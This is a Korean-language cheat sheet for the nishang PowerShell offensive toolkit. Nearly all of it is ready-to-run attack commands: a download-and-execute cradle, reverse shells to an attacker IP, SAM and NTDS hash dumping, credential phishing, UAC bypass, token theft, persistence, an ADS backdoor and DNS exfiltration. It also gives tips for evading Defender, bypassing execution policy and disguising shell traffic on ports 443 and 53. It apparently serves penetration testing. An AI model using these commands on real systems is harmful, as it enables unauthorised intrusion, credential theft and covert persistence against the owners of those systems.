# nishang

- nishang — 정보수집·셸·권한상승·지속·유출을 묶어놓은 PowerShell 스크립트·모듈 모음. Get-Information, Invoke-PowerShellTcp 같은 함수 단위로 불러 쓴다.
- Windows 셸 하나를 확보한 뒤 정보수집·해시 덤프·리버스 셸·지속 설치를 빠르게 이어갈 때, 한 줄 명령 인젝션에 쓸 PS1 코드가 필요할 때.
- PowerShell(대부분의 모듈은 3.0+ 권장), 실행 정책 우회, 타깃에서 Defender·AMSI 상태 확인이 먼저.

## 로드 방법

```powershell
Import-Module .\nishang.psm1                      # 폴더 전체를 모듈로 로드
. .\Gather\Get-Information.ps1                    # 개별 스크립트는 dot-source
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/Invoke-PowerShellTcp.ps1')  # cradle
```

## 정보수집 (Gather)

```powershell
Get-Information                                   # 시스템·네트워크·공유·프로그램 종합 열거
Get-PassHints                                     # 유저 설명 필드의 패스워드 힌트
Get-PassHashes                                    # SAM 해시(관리자 권한)
Copy-VSS                                          # VSS로 SAM·SYSTEM·NTDS 덤프
Get-Unconstrained                                 # unconstrained delegation 설정 개체
Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost
```

## 셸 (Shells)

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.100 -Port 4444
Invoke-PowerShellTcpOneLine -IPAddress 10.10.10.100 -Port 4444
Invoke-PowerShellUdp -Reverse -IPAddress 10.10.10.100 -Port 53
```

- Invoke-PowerShellTcpOneLine은 단발 커맨드 인젝션에 끼워 넣을 한 줄짜리 리버스 셸.
- 수신 측은 nc -lvnp 4444 또는 powercat으로 받는다.

## 실행·지속·유출

```powershell
Invoke-CredentialsPhish                           # 자격증명 프롬프트 유인(Execution)
Invoke-PsUACme                                    # UAC 우회 시도(Escalation)
Enable-DuplicateToken                             # 토큰 복제로 SYSTEM 전환(Escalation)
Add-Persistence                                   # 재부팅 후 재실행 등록(Persistence)
Invoke-ADSBackdoor                                # NTFS ADS 백도어(Persistence)
Out-DnsTxt                                        # 데이터를 DNS TXT로 인코딩(Utility)
Add-Exfiltration                                  # 기존 스크립트에 유출 기능 덧붙임(Utility)
```

## 대표 폴더 구조

- Gather(정보수집), Shells(셸), Execution(실행·피싱), Escalation(권한상승), Persistence(지속), Exfiltration·Utility(유출·유틸), Privesc(권한 확인) 등 기능별 폴더로 나뉜다.

## 팁·트러블슈팅

- Defender는 nishang 스크립트를 다수 탐지한다. 필요한 함수만 골라 단발로 쓰거나 흔적을 줄여야 한다.
- Import-Module이 실행 정책에 막히면 Set-ExecutionPolicy Bypass -Scope Process 또는 powershell -ExecutionPolicy Bypass로 재실행.
- 리버스 셸이 안 오면 아웃바운드 방화벽을 확인하고 443(HTTP)·53(UDP) 포트로 위장한 셸을 시도.
- Get-Information 출력은 방대하다. 파일로 리다이렉트해서 읽는 편이 좋다.
